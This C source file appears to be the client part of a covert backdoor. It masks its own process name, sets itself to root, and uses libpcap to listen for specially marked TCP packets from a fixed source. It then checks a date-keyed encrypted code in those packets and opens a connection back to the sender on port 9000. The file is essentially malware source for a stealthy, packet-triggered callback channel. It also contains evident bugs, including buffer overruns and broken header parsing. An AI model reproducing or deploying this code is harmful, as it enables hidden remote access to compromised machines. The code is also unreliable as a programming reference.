#include "client.h"

int main (int argc, char *argv[])
{
	/* Mask the process name */
	strcpy(argv[0], MASK);
	
	/* Change the UID/GID to 0 (raise to root) */
	if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        systemFatal("You need to be root for this");
        exit(0);
    }

	/* Call the rest of the code */
    client();
    
    /* Exit */
    return 0;
}

int client()
{
    char errorBuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char *filter = malloc(sizeof(char) * FILTER_BUFFER);
    pcap_t *handle;
    pcap_if_t *nics;
    pcap_if_t *nic;
    bpf_u_int32 net;
    bpf_u_int32 mask;
    
    /* Get the devices on the machine */
    if (pcap_findalldevs(&nics, errorBuffer) == -1)
    {
        systemFatal("Unable to retrieve device list");
    }
    
    /* Find a suitable nic from the device list */
    for (nic = nics; nic; nic = nic->next)
    {
        if (pcap_lookupnet(nic->name, &net, &mask, errorBuffer) != -1)
        {
            break;
        }
    }
    
    printf("%s\n", nic->name);
    /* Open the session */
    handle = pcap_open_live(nic->name, SNAP_LEN, 0, 0, errorBuffer);
    if (handle == NULL)
    {
        systemFatal("Unable to open live capture");
    }
    
    /* Create and parse the filter to the capture */
    snprintf(filter, FILTER_BUFFER, "src %s and src port %s", SOURCE_IP, SOURCE_PORT);
    if (pcap_compile(handle, &fp, filter, 0, net) == -1)
    {
        systemFatal("Unable to compile filter");
    }
    printf("%s\n", filter);
    /* Set the filter on the listening device */
    if (pcap_setfilter(handle, &fp) == -1)
    {
        systemFatal("Unable to set filter");
    }
    
    /* Call pcap_loop and process packets as they are received */
    if (pcap_loop(handle, -1, receivedPacket, NULL) == -1)
    {
        systemFatal("Error in pcap_loop");
    }
    
    /* Clean up */
    free(filter);
    pcap_freecode(&fp);
    pcap_close(handle);
    
    return 0;
}

void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    const struct ip *iph = NULL;
    const struct tcphdr *tcph = NULL;
    struct sockaddr_in server;
    struct hostent *hp;
    char *host, *encryptedField;
    char *code = malloc(sizeof(char) * 4);
    char strtosend[80];
    char Date[11];
    time_t t;
    struct tm* tm;
    
    time(&t);
    tm = localtime(&t);

    host = malloc(sizeof(struct in_addr));
        
    int ipHeaderSize = 0, sd, arg;
    
    /* Get the IP header and offset value */
    iph = (struct ip*)(packet + SIZE_ETHERNET);
    
#ifdef _IP_VHL
    ipHeaderSize = IP_VHL_HL(iph->ip_vhl) * 4;
#else
    ipHeaderSize = iph->ip_hl * 4;
#endif
    
    if (ipHeaderSize < 20)
    {
        return;
    }
    
    /* Ensure that we are dealing with one of our sneaky TCP packets */
    if (iph->ip_p == IPPROTO_TCP)
    {
        /* Get our packet */
        tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + ipHeaderSize);

        if((sd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
            systemFatal("Cannot Create socket");
        }
        
        /* Make sure the packet contains our code */
        memcpy(code, (tcph + 4), sizeof(code));
        
        strftime(Date, sizeof Date, "%Y:%m:%d", tm);
        printf("%s\n", Date);
        
        printf("%d", tcph->th_seq);
        
        encryptedField = encrypt_data(code, Date);
        printf("%s\n", encryptedField);
        
        if(strncmp(encryptedField, "comp", 4)){
            printf("%s\n", encryptedField);
        }
        
        arg = 1;
        if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        {
            systemFatal("setsockopt");
        }
        
        bzero((char *)&server, sizeof(struct sockaddr_in));
        server.sin_family = AF_INET;
        server.sin_port = htons(9000);
        
        inet_ntop(AF_INET, &(iph->ip_src), host, (socklen_t) INET_ADDRSTRLEN);
        if((hp = gethostbyname(host)) == NULL){
            systemFatal("unknown server address \n");
        }
        bcopy(hp->h_addr, (char *)&server.sin_addr, hp->h_length);
        
        if(connect(sd, (struct sockaddr *)&server, sizeof(server)) == -1){
            systemFatal("can't connect to server\n");
        }
        
        strcpy(strtosend, host);
        send(sd, strtosend, 80, 0);
        free(host);
        free(code);
    }
}
